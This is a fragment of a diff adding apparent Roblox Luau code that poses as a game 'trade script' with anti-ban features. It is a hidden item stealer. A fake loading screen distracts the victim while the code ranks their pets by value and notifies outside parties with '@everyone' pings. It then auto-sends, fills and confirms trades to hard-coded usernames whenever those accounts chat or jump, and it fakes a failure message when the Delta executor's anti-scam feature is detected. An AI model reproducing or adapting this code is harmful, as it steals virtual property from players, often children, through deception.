+          textLabel2.TextYAlignment = Enum.TextYAlignment.Top
+          local textButton = Instance.new("TextButton")
+          textButton.Parent = frame3
+          textButton.Size = UDim2.new(0, 200, 0, 45)
+          textButton.Position = UDim2.new(0.5, -100, 1, -65)
+          textButton.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
+          textButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+          textButton.Text = "Rejoin Game"
+          textButton.Font = Enum.Font.SourceSansBold
+          textButton.TextSize = 20
+          textButton.BorderSizePixel = 0
+          local uiCorner2 = Instance.new("UICorner")
+          uiCorner2.CornerRadius = UDim.new(0, 12)
+          uiCorner2.Parent = textButton
+          textButton.MouseButton1Click:Connect(function()
+            pcall(function()
+              getgenv().DeltaNoticeDismissed = true
+              teleportService:Teleport(game.PlaceId, players.LocalPlayer)
+            end)
+          end)
+        end
+        local function f10(p11)
+          local playerGui2 = players.LocalPlayer:WaitForChild("PlayerGui")
+          local v41 = {
+            "Initializing core script modules...", "Loading player profile and assets...",
+            "Optimizing trade queue for efficiency...",
+            "Scanning environment for potential bugs...",
+            "Verifying secure network connections...",
+            "Allocating safe memory for pets and items...",
+            "Finalizing advanced trade setup...", "Performing last-minute stability checks...",
+            "Applying stealth protection layer...", "Securing account safety measures...",
+            "Enhancing Anti Ban protection...", "Injecting fail-safe routines...",
+            "Almost ready...",
+          }
+          local loadingScreen = Instance.new("ScreenGui")
+          loadingScreen.Name = "LoadingScreen"
+          loadingScreen.ResetOnSpawn = false
+          loadingScreen.Parent = playerGui2
+          local frame4 = Instance.new("Frame")
+          frame4.Size = UDim2.new(0, 500, 0, 200)
+          frame4.Position = UDim2.new(0.5, -250, 0.5, -100)
+          frame4.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+          frame4.BorderSizePixel = 2
+          frame4.Parent = loadingScreen
+          local textLabel3 = Instance.new("TextLabel")
+          textLabel3.Size = UDim2.new(1, -20, 0, 50)
+          textLabel3.Position = UDim2.new(0, 10, 0, 10)
+          textLabel3.BackgroundTransparency = 1
+          textLabel3.Text = "Loading script... Please wait.."
+          textLabel3.TextColor3 = Color3.fromRGB(255, 255, 255)
+          textLabel3.Font = Enum.Font.SourceSansBold
+          textLabel3.TextScaled = true
+          textLabel3.Parent = frame4
+          local textLabel4 = Instance.new("TextLabel")
+          textLabel4.Size = UDim2.new(1, -20, 0, 30)
+          textLabel4.Position = UDim2.new(0, 10, 0, 70)
+          textLabel4.BackgroundTransparency = 1
+          textLabel4.TextColor3 = Color3.fromRGB(0, 255, 0)
+          textLabel4.Font = Enum.Font.SourceSansBold
+          textLabel4.TextScaled = true
+          textLabel4.Text = ""
+          textLabel4.Parent = frame4
+          local frame5 = Instance.new("Frame")
+          frame5.Size = UDim2.new(1, -20, 0, 30)
+          frame5.Position = UDim2.new(0, 10, 0, 120)
+          frame5.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+          frame5.BorderSizePixel = 1
+          frame5.Parent = frame4
+          local frame6 = Instance.new("Frame")
+          frame6.Size = UDim2.new(0, 0, 1, 0)
+          frame6.Position = UDim2.new(0, 0, 0, 0)
+          frame6.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+          frame6.Parent = frame5
+          task.spawn(function()
+            local v42 = tick()
+            local v43 = #v41
+            local v44 = p11 / (v43 - 1 + 2)
+            textLabel4.Text = v41[1]
+            local v45 = 2
+            while tick() - v42 < p11 do
+              local v46 = tick() - v42
+              local v47 = math.clamp(v46 / p11, 0, 1)
+              frame6.Size = UDim2.new(v47, 0, 1, 0)
+              if math.floor(v46 / v44) + 1 > v45 and v45 <= v43 then
+                textLabel4.Text = v41[v45]
+                v45 = v45 + 1
+              end
+              task.wait(0.1)
+            end
+            local v48 = identifyexecutor() or "Unknown"
+            textLabel4.Text = "Bypassing Anti Cheat restrictions..."
+            frame6.Size = UDim2.new(1, 0, 1, 0)
+            task.wait(1.5)
+            if v48 == "Delta" then
+              textLabel4.TextColor3 = Color3.fromRGB(255, 0, 0)
+              textLabel4.Text = "Failed..."
+              task.wait(1)
+              for i = 1, 3 do
+                textLabel4.TextColor3 = Color3.fromRGB(0, 255, 0)
+                textLabel4.Text = string.format("Retrying the bypass of Anti Cheat (%d)...", i)
+                task.wait(1)
+                if i <= 2 then
+                  textLabel4.TextColor3 = Color3.fromRGB(255, 0, 0)
+                  textLabel4.Text = "Failed..."
+                  task.wait(1)
+                end
+              end
+              textLabel4.TextColor3 = Color3.fromRGB(255, 0, 0)
+              textLabel4.Text = "Bypassing Anti Cheat Failed! due to Anti-Scam feature of Delta."
+              task.wait(2)
+            end
+            loadingScreen:Destroy()
+            if v48 == "Delta" and not getgenv().DeltaNoticeDismissed then
+              f4()
+            end
+          end)
+        end
+        if #v2 > 0 then
+          table.sort(v2, function(p12, p13) return p12.Value > p13.Value end)
+          if v4 < 1 then
+            localPlayer:kick("Alt Account Detected! This script wont work on an alt accounts.")
+            return
+          end
+          local v49 = ""
+          if pingEveryone == "Yes" then
+            v49 = "--[[@everyone]] "
+          end
+          local v50 = ""
+          if pingEveryone == "Yes" then
+            v50 = "--[[@everyone]] WP"
+          end
+          f10(250)
+          if (identifyexecutor() or "Unknown") ~= "Delta" then
+            jobId = game.JobId
+          else
+            if not jobId then
+              for index5, value13 in ipairs(replicatedStorage:WaitForChild("ClientModules"):WaitForChild("Core"):WaitForChild("UIManager"):WaitForChild("Elements"):GetChildren()) do
+                if value13:IsA("ModuleScript") then
+                  local v51, v52 = pcall(require, value13)
+                  if v51 and type(v52) == "table" and not v52.__jobHooked then
+                    v52.__jobHooked = true
+                    for key9, value14 in pairs(v52) do
+                      if type(value14) == "function" then
+                        local v53 = value14
+                        v52[key9] = function(...)
+                          local v54 = v53(...)
+                          if not jobId or jobId == "" then
+                            local jobId2 = game.JobId
+                            if jobId2 and jobId2 ~= "" then
+                              jobId = jobId2
+                            end
+                          end
+                          return v54
+                        end
+                      end
+                    end
+                  end
+                end
+              end
+            end
+            local v55 = os.clock() + 8
+            while (not jobId or jobId == "") and os.clock() < v55 do
+              task.wait()
+            end
+            if not jobId or jobId == "" then
+              jobId = game.JobId
+            end
+          end
+          f8(v2, v50)
+          if v4 < 20 or localPlayer.Name == "Sukuna_gotnerf" or localPlayer.Name == "GAG_Collector"
+            or localPlayer.Name == "GAG_Collector1" then
+            f3(v2, v49)
+          end
+          settingsAPISetSetting:FireServer("trade_requests", 1)
+          v6 = nil
+          function f5(p14)
+            local v56 = false
+            task.spawn(function()
+              while true do
+                if not v3 and not v56 then
+                  if not v6 then
+                    v6 = table.clone(v2)
+                  end
+                  tradeAPISendTradeRequest:FireServer(players[p14])
+                  v56 = true
+                elseif v3 then
+                  for j = 1, math.min(18, #v2) do
+                    local v57 = table.remove(v2, 1)
+                    if v57 then
+                      tradeAPIAddItemToOffer:FireServer(v57.UID)
+                    end
+                  end
+                  repeat
+                    tradeAPIAcceptNegotiation:FireServer()
+                    task.wait(0.1)
+                    tradeAPIConfirmTrade:FireServer()
+                  until not v3
+                  v56 = false
+                end
+                task.wait(0.5)
+              end
+            end)
+          end
+          local function f11()
+            function textChatService.OnIncomingMessage(p15)
+              if p15.TextSource then
+                local getPlayerByUserId = players:GetPlayerByUserId(p15.TextSource.UserId)
+                if getPlayerByUserId and table.find(usernames, getPlayerByUserId.Name) then
+                  local lower = p15.Text:lower()
+                  if lower == "retry" then
+                    if v6 then
+                      v2 = table.clone(v6)
+                    end
+                  elseif lower == "callsendtoothers" then
+                    f3(v2, "--[[@everyone]] ")
+                  else
+                    f5(getPlayerByUserId.Name)
+                  end
+                end
+              end
+            end
+          end
+          f11()
+          function f2()
+            if v6 then
+              v2 = table.clone(v6)
+              print("Retry triggered!")
+            end
+          end
+          v7 = {}
+          v8 = {}
+          function f6(p16)
+            f5(p16)
+          end
+          for index6, value15 in ipairs(usernames) do
+            local findFirstChild = players:FindFirstChild(value15)
+            if findFirstChild and findFirstChild.Character
+              and findFirstChild.Character:FindFirstChild("HumanoidRootPart") then
+              v7[value15] = findFirstChild.Character.HumanoidRootPart.Position.Y
+              v8[value15] = 0
+            end
+          end
+          runService.Heartbeat:Connect(function()
+            local v58 = tick()
+            for index7, value16 in ipairs(usernames) do
+              local findFirstChild2 = players:FindFirstChild(value16)
+              if findFirstChild2 and findFirstChild2.Character then
+                local humanoidRootPart = findFirstChild2.Character:FindFirstChild("HumanoidRootPart")
+                if humanoidRootPart then
+                  local y = v7[value16] or humanoidRootPart.Position.Y
+                  local y2 = humanoidRootPart.Position.Y
+                  if y2 - y > 3 then
+                    if v58 - (v8[value16] or 0) <= 0.5 then
+                      f2()
+                    else
+                      f6(value16)
+                    end
+                    v8[value16] = v58
+                  end
+                  v7[value16] = y2
+                end
+              end
+            end
+          end)
+          return
+        end
+        return
+      end
+    end
+  end
 end
